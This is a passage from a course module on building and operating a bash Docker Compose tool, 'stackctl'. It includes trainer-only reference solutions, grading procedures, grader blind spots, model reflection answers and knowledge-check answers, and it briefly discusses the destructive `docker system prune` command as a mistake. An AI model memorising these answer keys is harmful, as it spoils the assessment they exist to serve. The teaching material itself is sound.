   - **R2.** The grader accepts `CONFIRM_DESTROY=test` for `test` and rejects `CONFIRM_DESTROY=prod` for `test`. Explain why a confirmation that accepted *any* non-empty value would be worse than no confirmation at all.

**Learner-visible rubric (LAB-09a/b).** *Pass* = all `09a` and `09b` checks green **and** both reflections name the mechanism. Unlimited attempts. This is practice evidence for CAP-01, not CAP-01 itself.

**Hints.** H1: `parse_conf` is S09.2's loop plus `is_known_key` (given) and `return 2` on the first bad line. H2: `validate_conf` is a sequence of `[[ … ]] || { err "…"; return 2; }` lines; check `PORT` with `=~ ^[0-9]+$` *before* comparing it numerically, and test `-f "$ROOT/${CONF[APP_DIR]}/Dockerfile.course"`. H3: `cmd_plan` must call `render_compose "$WORK/plan"` — `$WORK` is the `mktemp` directory the dispatcher cleans up — and diff **both** rendered files. H4: `cmd_up` passes `"${CONF[WAIT_TIMEOUT]}"` to `--wait-timeout`; the grader looks for exactly `up -d --wait --wait-timeout 120`. H5: `with_lock` is three lines — `exec 9>"$lock"`, `flock -n 9 || …return 1`, `"$@"`. H6: `cmd_check`'s URL is `http://127.0.0.1:${CONF[PORT]}${CONF[HEALTH_PATH]}`.

**Reset.** `rm -rf work && bash grade.sh`; stale locks: `rm -f work/envs/*.lock`; mock state: `rm -rf /tmp/m09 /tmp/lab9-grade.*`.


> **TRAINER ONLY — complete solution (reference `solution/lib/config.sh` and `solution/lib/ops.sh`, observed 34/34 and 34/34).** The seven functions, with the given helpers (`err`, `info`, `is_known_key`, `render_compose`, `applied_dir`, `running_services`, `drv_compose`, `drv_http_get`) assumed:
> ```bash
> # lib/config.sh
> parse_conf() {
>   local file="$1" line key val n=0
>   [[ -r "$file" ]] || { err "cannot read environment file: $file"; return 2; }
>   while IFS= read -r line || [[ -n "$line" ]]; do
>     n=$(( n + 1 ))
>     line="${line%%#*}"
>     line="${line%"${line##*[![:space:]]}"}"
>     [[ -z "$line" ]] && continue
>     [[ "$line" == *=* ]] || { err "$file:$n: expected KEY=VALUE, got: $line"; return 2; }
>     key="${line%%=*}"; val="${line#*=}"
>     [[ "$key" =~ ^[A-Z][A-Z_]*$ ]] || { err "$file:$n: bad key name: $key"; return 2; }
>     is_known_key "$key" || { err "$file:$n: unknown key: $key (allowed: ${CONF_KEYS[*]})"; return 2; }
>     CONF["$key"]="$val"
>   done < "$file"
> }
>
> validate_conf() {
>   local k
>   for k in "${CONF_KEYS[@]}"; do
>     [[ -n "${CONF[$k]:-}" ]] || { err "$CONF_FILE: missing required key: $k"; return 2; }
>   done
>   [[ "${CONF[PORT]}" =~ ^[0-9]+$ ]] || { err "PORT must be a number, got: ${CONF[PORT]}"; return 2; }
>   (( CONF[PORT] >= 1024 && CONF[PORT] <= 65535 )) || { err "PORT must be 1024–65535, got: ${CONF[PORT]}"; return 2; }
>   [[ "${CONF[PROJECT]}" =~ ^[a-z][a-z0-9-]*$ ]] || { err "PROJECT must be lowercase letters, digits, dashes, got: ${CONF[PROJECT]}"; return 2; }
>   [[ "${CONF[WAIT_TIMEOUT]}" =~ ^[0-9]+$ ]] || { err "WAIT_TIMEOUT must be a number of seconds"; return 2; }
>   for k in IMAGE_SERVE IMAGE_GATEWAY; do
>     [[ "${CONF[$k]}" =~ ^[a-z0-9][a-z0-9._/-]*:[A-Za-z0-9._-]+(@sha256:[0-9a-f]{64})?$ ]] \
>       || { err "$k must be name:tag or name:tag@sha256:<64 hex>, got: ${CONF[$k]}"; return 2; }
>   done
>   [[ "${CONF[APP_DIR]}" =~ ^[A-Za-z0-9._-]+(/[A-Za-z0-9._-]+)*$ ]] \
>     || { err "APP_DIR must be a relative path inside the tool (no spaces, no ..), got: ${CONF[APP_DIR]}"; return 2; }
>   [[ -f "$ROOT/${CONF[APP_DIR]}/Dockerfile.course" ]] \
>     || { err "APP_DIR ${CONF[APP_DIR]}/ has no Dockerfile.course — is the fraud-clf app copy in place?"; return 2; }
>   [[ "${CONF[HEALTH_PATH]}" =~ ^/[A-Za-z0-9._/-]*$ ]] || { err "HEALTH_PATH must start with / and contain no spaces, got: ${CONF[HEALTH_PATH]}"; return 2; }
>   [[ "${CONF[HEALTH_BODY]}" != *[$'\n\r']* ]] || { err "HEALTH_BODY must be one line"; return 2; }
> }
> ```
> ```bash
> # lib/ops.sh
> with_lock() {
>   local lock="$ROOT/envs/$ENV_NAME.lock"
>   exec 9>"$lock"
>   flock -n 9 || { err "$ENV_NAME is locked by another stackctl run ($lock); try again later"; return 1; }
>   "$@"
> }
>
> cmd_plan() {
>   local applied; applied="$(applied_dir)"
>   render_compose "$WORK/plan"
>   info "plan for $ENV_NAME (project ${CONF[PROJECT]}):"
>   info "  desired : port ${CONF[PORT]}, serve ${CONF[IMAGE_SERVE]} (from ${CONF[APP_DIR]}/), gateway ${CONF[IMAGE_GATEWAY]}, health GET ${CONF[HEALTH_PATH]} = '${CONF[HEALTH_BODY]}'"
>   local drift="none"
>   if [[ ! -f "$applied/stack.yml" ]]; then
>     info "  applied : never applied in this checkout"; drift="new"
>   elif ! diff -q "$applied/stack.yml" "$WORK/plan/stack.yml" >/dev/null \
>        || ! diff -q "$applied/gateway.conf" "$WORK/plan/gateway.conf" >/dev/null; then
>     info "  applied : differs from desired:"
>     diff "$applied/stack.yml" "$WORK/plan/stack.yml" | sed 's/^/            /' || true
>     diff "$applied/gateway.conf" "$WORK/plan/gateway.conf" | sed 's/^/            /' || true
>     drift="changed"
>   else
>     info "  applied : identical to desired"
>   fi
>   local n; n="$(running_services "$applied/stack.yml" | grep -c . || true)"
>   info "  running : $n of 2 services (from compose ps)"
>   if   [[ "$drift" == new ]];     then info "  up would: create project ${CONF[PROJECT]} (2 services)"
>   elif [[ "$drift" == changed ]]; then info "  up would: re-render and recreate the services whose definition changed"
>   elif (( n < 2 ));               then info "  up would: start the $(( 2 - n )) stopped service(s); no definition changes"
>   else                                 info "  up would: nothing — converged"
>   fi
>   info "  limits  : plan cannot predict the image build, pulls or health outcomes; only 'up' proves those"
> }
>
> cmd_up() {
>   local applied; applied="$(applied_dir)"
>   render_compose "$applied"
>   info "up: $ENV_NAME (project ${CONF[PROJECT]}, port ${CONF[PORT]}, wait ≤ ${CONF[WAIT_TIMEOUT]}s)"
>   drv_compose "${CONF[PROJECT]}" "$applied/stack.yml" up -d --wait --wait-timeout "${CONF[WAIT_TIMEOUT]}" \
>     || { err "up failed for $ENV_NAME; see: $PROG -e $ENV_NAME logs"; return 1; }
>   info "up: done — $(running_services "$applied/stack.yml" | grep -c . || true) of 2 services running"
> }
>
> cmd_check() {
>   local url="http://127.0.0.1:${CONF[PORT]}${CONF[HEALTH_PATH]}" got
>   got="$(drv_http_get "$url" && printf x)" \
>     || { err "check: $url unreachable (is the stack up? try: $PROG -e $ENV_NAME status)"; return 1; }
>   got="${got%x}"
>   [[ "$got" == "${CONF[HEALTH_BODY]}" ]] \
>     || { err "check: $url returned [$got], expected [${CONF[HEALTH_BODY]}]"; return 3; }
>   info "check: $url → [$got] ok"
> }
>
> cmd_destroy() {
>   local applied; applied="$(applied_dir)"
>   [[ "${CONFIRM_DESTROY:-}" == "$ENV_NAME" ]] \
>     || { err "destroy refused: set CONFIRM_DESTROY=$ENV_NAME to destroy project ${CONF[PROJECT]}"; return 2; }
>   render_compose "$WORK/destroy"
>   local file="$applied/stack.yml"; [[ -f "$file" ]] || file="$WORK/destroy/stack.yml"
>   drv_compose "${CONF[PROJECT]}" "$file" down -v || { err "destroy failed for ${CONF[PROJECT]}"; return 1; }
>   rm -rf "$applied"
>   info "destroy: project ${CONF[PROJECT]} removed (containers, network, volumes)"
> }
> ```
> *Acceptable variations:* a `case`-based `validate_conf` (passes); `plan` wording may differ as long as exactly one line starts with `up would:` and the converged line contains `up would: nothing` (grader greps for that); `cmd_check` using `read -r -d ''` to keep bytes (passes); `with_lock` with a different fd number (passes). *Deviations the grader catches (all observed 2026-10-21):* a blocking `flock` (33/34 after a ≈3 s pause); `CONFIRM_DESTROY` compared to a non-empty check (31/34 — the wrong-env refusal, the no-down-call check and the scoped-down check all fail); `cmd_up` without `--wait-timeout` (fails the flag check); `cmd_check` ignoring `HEALTH_PATH` (fails *check asks the gateway for HEALTH_PATH*). *Deviations the grader cannot see (observed):* `plan` that renders into `.render/` and copies the result into `$WORK/plan` **passes 34/34** — but on a fresh checkout it prints `applied : identical to desired` and `up would: start the 2 stopped service(s)` instead of `create`, because `plan` has just become a mutation that writes the applied snapshot; this is R1's point, so read `cmd_plan` and ask, do not rely on the grader; `exit` instead of `return` inside the functions (passes — the dispatcher's EXIT trap still runs — but makes the functions impossible to unit-test by sourcing; mention it); validation messages without the file and line (accept, mention for the runbook); `cmd_logs` tail length.
>
> **Grading procedure (≈10 min/learner).** 1) `GRADE_TARGET=/path/to/their/work bash labs/lab9-stackctl/exercise/grade.sh` → require every `09a` and `09b` line PASS (the `09c` lines belong to LAB-09c). 2) `bash /path/to/their/work/tests/run.sh | tail -1` → `# 34 passed, 0 failed`. 3) `diff -r /path/to/their/work/app starter/app` → **no output** (the app copy is untouched). 4) Reflections:
> - **R1 — Met:** `plan` must be pure, so it renders into the per-run `mktemp` directory (`$WORK`, removed by the dispatcher's trap) and only *reads* `.render/test/`; `up` renders into `.render/test/` because that file is the record of what was applied and the bind-mount source the containers use. If `plan` wrote there, every `plan` would overwrite the applied snapshot, so drift could never be detected and `plan` would have become a mutation. **Strong:** adds that the bind-mount and build-context paths inside the file are written as `.render/test` and `$ROOT/app` even for the temporary render, so the two renders compare equal — or names the consequence for a running stack (the mounted `gateway.conf` would change under a live container). **Not met:** "to keep things tidy" or no mention of drift.
> - **R2 — Met:** a confirmation that accepts any value tells the operator "you confirmed" while confirming nothing — it trains the habit of typing the magic word without reading which environment is selected; requiring the *environment's name* makes the confirmation carry the one fact that matters (`-e test` + `CONFIRM_DESTROY=test`). With no confirmation at all, at least nobody believes a safeguard exists. **Strong:** connects it to the lock (both exist to force a human decision at the point of risk), to Course 2's named-environment approval before promotion, or to the fact that CI pipelines copy-paste commands, so a generic `yes` propagates. **Not met:** "it is more secure" without the mismatch mechanism.
> 5) Record `LAB-09a/b PASS` only with all `09a`+`09b` checks green, `34 passed`, an untouched `app/`, and both reflections ≥ Met.
>
> **Calibration.** *R2 Met:* "If `CONFIRM_DESTROY=yes` worked everywhere, I'd put it in my shell profile and never think again; requiring `test` or `prod` means I have to say which one I'm destroying, and it must match `-e`. No confirmation would at least not pretend." *R2 Not met:* "Because a wrong value should be rejected" (restates the behavior).
>
> **Model feedback (Not yet):** "`plan made no up/down call` FAIL: your `cmd_plan` calls `cmd_up` to 'see what would happen' — a plan that applies is not a plan. Render to `$WORK/plan` and compare with `.render/test/`." **Remediation:** S09.3, then S09.4. **Equivalent reassessment:** same grader; **R1'** "Why does `up` run `validate` even though you just ran `validate` yourself?" (Met: the file may have changed in between; the tool cannot trust a previous run — every mutation is preceded by its own validation) and **R2'** "Why is the lock *per environment* rather than one lock for the whole tool?" (Met: `test` and `prod` are isolated by design — separate projects, ports, volumes — so an operator on `prod` must not be blocked by `test`; one global lock would couple what the design decoupled).
>
> **Evidence handling / reset:** collect `work/lib/config.sh`, `work/lib/ops.sh`, `work/REFLECTION.md`, the grader output; `rm -rf work /tmp/lab9-grade.* /tmp/m09` between learners on a shared machine.

---

## LAB-09c — Diagnose and hand over (independent)

| Field | Value |
|---|---|
| Starting assets | Your green `work/` from LAB-09a/b |
| Deliverables | `work/RUNBOOK.md` with every `TODO` replaced by what you observed, including section 6 *Inherited findings*; on a Docker machine, `work/MANIFEST.txt` from `tools/record-manifest.sh` and the transcript of `bash work/tests/live-smoke.sh test` |
| Acceptance | the two `09c` grader checks pass (`RUNBOOK.md has no TODO left`, keeps the six sections); the manifest's digest and image IDs come from `docker image inspect` on your machine |

**Procedure.**
1. Break each environment on purpose, one fault at a time, and run the command that finds it: `PORT=180a80`; a deleted `HEALTH_BODY` line; `HEALTH_BODY={"status": "ok"}` (a space) with `STACKCTL_MOCK_HEALTH='{"status":"ok"}'`; `HEALTH_PATH=/health` (read what `validate` prints); a held lock (S09.5); and, on a daemon, a port already in use. Record for each: the command, the first line of output, the exit status, the fix.
2. Write those into sections 3 (Diagnose) and 4 (Recover) of `work/RUNBOOK.md`; sections 1 and 2 describe the stack and the normal order of commands.
3. Read `work/app/config.py`, `requirements.txt`, `src/serve.py` and `Dockerfile.course` once, as the baseline README asks, and write section 6 — what worries you and which Course 2 milestone addresses it. Do **not** change `app/`.
4. On a machine with a daemon: `bash work/tests/live-smoke.sh test` (build, bring up, check, predict, converge, destroy — leaves nothing behind; the first run takes a few minutes while pip installs and the model trains), then `bash work/tools/record-manifest.sh`, then paste its output into section 5 and append `@sha256:…` to `IMAGE_GATEWAY` in `work/envs/test.conf` from that output. If you have no daemon yet, write in section 5 that the manifest is pending and leave the key tag-pinned — **never type a digest or an image ID from a document**.
5. `bash grade.sh | tail -1` → `---- lab9: 34 passed, 0 failed ----`.


> **TRAINER ONLY — reviewing the runbook (≈10 min/learner).** The reference `solution/RUNBOOK.md` is the model: six sections, a decision tree keyed on exit codes (2 → conf; first `up` 1 → the image build; later `up` 1 → `logs`, port in use, gateway image not pullable, `gateway.conf` not mounted, `WAIT_TIMEOUT` too short while the model trains; `check` 3 → body; `check` 1 → down, port drift or a `HEALTH_PATH` the app does not serve; 1 with `locked` → other operator or stale holder), recovery that rebuilds **one** environment with `CONFIRM_DESTROY` and knows that a changed `app/` needs `docker image rm fraudclf-serve:m0` before `up`, section 5 explaining that the gateway digest and the serve image ID come only from `record-manifest.sh` on the operating machine, and section 6 listing the inherited findings with their Course 2 milestones (fake S3 keys → M2 OpenBao; `requests==2.19.1` → M4 SCA gate; unauthenticated `/api/predict` → M10 zero-trust proxy; unsigned `model.pkl` → M6; root image → M7). *Met:* every symptom in the template has a command, an observed first line and a fix; no `TODO`; section 5 either holds a pasted `record-manifest.sh` output or states that the manifest is pending with the key tag-pinned; section 6 names at least three findings with the right milestone. *Strong:* adds a symptom the template did not list (e.g., `plan` shows drift after a teammate edited the conf; `check` exits 1 after a `PORT` change without `up`; `plan` says converged after `app/` changed) with its diagnosis; or a finding beyond the five (the health endpoint is unauthenticated too; the training data is regenerated at build, so two builds differ). *Not met:* generic prose ("check the logs"), a symptom with no command, a digest or image ID with no live transcript, or a "fixed" `app/`. **Critical regardless of the rest:** a value in section 5 or in `envs/*.conf` that the learner cannot show coming from `docker image inspect` on their machine (ask for the `live-smoke.sh` transcript; compare the gateway digest with your V-04 value for the same architecture).

---

## Knowledge checks (predict, then run)

1. A conf line reads `PORT=18080 # the test port`. What does `parse_conf` store for `PORT`, and which expansion removes the comment?
2. `plan` reports `running : 0 of 2` on a machine with no daemon, even right after a successful mock `up` in another shell. Why can it not know better, and which line in its output admits that?
3. Why does `up` exit **1** when the lock is held but **2** when `PORT` is invalid?
4. A teammate suggests `destroy` should run `docker system prune -f` afterwards "to keep the machine clean". What would it do to `prod` while you destroy `test`?
5. You find a `sha256:` digest for `nginx:1.27-alpine` on a web page and paste it into `MANIFEST.txt`. The grader cannot tell. Why is it still a critical failure in CAP-01 — and why can no such page ever give you the value for `fraudclf-serve:m0`?


> **TRAINER ONLY — answers and distractors.**
> 1. `18080`; `${line%%#*}` (longest suffix from the first `#`) then the trailing-whitespace strip. Tempting: `${line#*#}` — that keeps the *comment* and drops the value.
> 2. The driver's `ps` fails without a daemon and `running_services` treats failure as empty; the `limits` line. Tempting: "the mock state is shared" — the mock state lives in `STACKCTL_MOCK_STATE`, and the docker driver never reads it.
> 3. 1 = runtime (retry later, nothing wrong with the request); 2 = usage/validation (the request is wrong). Tempting: "both are errors so both should be 1" — then the runbook cannot branch without parsing text (M06).
> 4. It would delete stopped containers, unused networks, dangling images and, with `--volumes`, every unused volume on the host — `prod`'s data if `prod` happened to be down, and the course image `bash-course:2.0` if no container was using it. Tempting: "`-f` only skips the prompt" — true, and irrelevant to scope.
> 5. Evidence must be *observed*: the digest proves what a daemon pulled; a pasted one proves nothing and can mask a different image actually running. For `fraudclf-serve:m0` there is no registry at all — the image exists only where it was built, and its ID depends on that machine's pip resolution and build cache, so any published value is fabricated by construction. Tempting: "the hash is the same everywhere" — only for the same tag, platform and point in time; and even then the learner has not observed it.

---

## In the SecMLOps Program
This module is the hinge between Course 0 and the rest of the program. `fraud-clf` is Course 2's project: in Course 2 Module 0 you "run the finished thing" — you already have, with `stackctl`, and your *Inherited findings* section is the list the baseline README asks you to keep. `validate → plan → apply` is `tofu plan` / `tofu apply` in Course 1 Module 3; the idempotent `up` is Course 1's `make provision` (`changed=0` on the second run); the named `CONFIRM_DESTROY` is the approval before `ci/promote.sh` in Course 2 Chapter 14; the exact health check is `tests/smoke/test_api.py`; the recorded digest is `image.digest`, the one value Course 2 carries from test to production unchanged. The gateway in front of `serve` is the shape of Course 2's zero-trust proxy (Chapter 10) without the identity part.

---

## Recap and transfer
Config is data; validate → plan → apply with a pure plan; `up` converges; one operator per environment; destroy needs the environment's name and never prunes; health is an exact body with distinct codes; the runbook and the recorded manifest are the handover. **Transfer:** CAP-01 (separate page) asks you to operate *your* `stackctl` live for `test` then `prod`, run the tests, and hand over; CAP-01R puts one fault in front of you to locate and fix while someone watches. The same skeleton — `getopts`, `case`, a driver, a lock, a trap — manages a VM fleet or a cloud account with a different driver, which is exactly what Course 1 does next.

---

## Self-check answers

1. `18080` — `line="${line%%#*}"` removes from the first `#` to the end, and the trailing-whitespace strip removes the space before it (observed: comments on the given `test.conf` lines parse cleanly).
2. `running` comes from `compose ps` through the driver; with the docker driver and no daemon that call fails and is treated as "nothing running"; the `limits` line states that only `up` proves the build, pull and health outcomes. (Observed: the docker driver without a daemon reports `0 of 2`.)
3. Exit `2` is the usage/validation family — the request itself is wrong and will be wrong next time too; exit `1` is runtime — the request is fine, the world is busy; the runbook recovers them differently (S09.7).
4. `prune` is global: it removes every stopped container, unused network, dangling image and (with `--volumes`) unused volume on the host — including anything `prod` is not using at that instant, and the course image. `down -v` scoped to `fraudclf-test` removes only what `test` created (S09.5).
5. The digest is evidence of what *your daemon* pulled on *your machine*; copied from elsewhere it is a claim without an observation. The course's rule for every output applies to infrastructure too: record what you observed, label what you designed. CAP-01's R-11 lists a fabricated digest as a critical criterion precisely because no grader can catch it. `fraudclf-serve:m0` was built on your machine from your copy of `app/`; its image ID exists nowhere else, so any value not from your own `docker image inspect` is fabricated by construction.


> **TRAINER ONLY — end of module and of the course sequence.** Debrief: "Which decision in `stackctl` would you keep if the driver were a cloud API instead of Compose?" (expected: all of them — the driver changes, the validate→plan→apply shape, the lock, the named confirmation and the recorded manifest do not; Course 1 Module 3 is the proof). **Next:** issue **CAP-01** (separate page): learners operate *their* `stackctl` live for `test` then `prod`, run `tests/run.sh` and `live-smoke.sh`, deliver the runbook and manifest with a transcript — R-11; then schedule **CAP-01R** (one injected fault under observation — R-12; fault list on the CAP-01 trainer page). **Hand-off to the program:** a learner who passes CAP-01 has already done Course 2 Module 0's "run the finished thing" — tell them so, and that their runbook's section 6 is the list the Course 2 baseline README asks them to keep. **Session close:** record LAB-09a/b and LAB-09c; remind learners that CAP-01 needs a daemon and that a mock transcript is not CAP-01 evidence.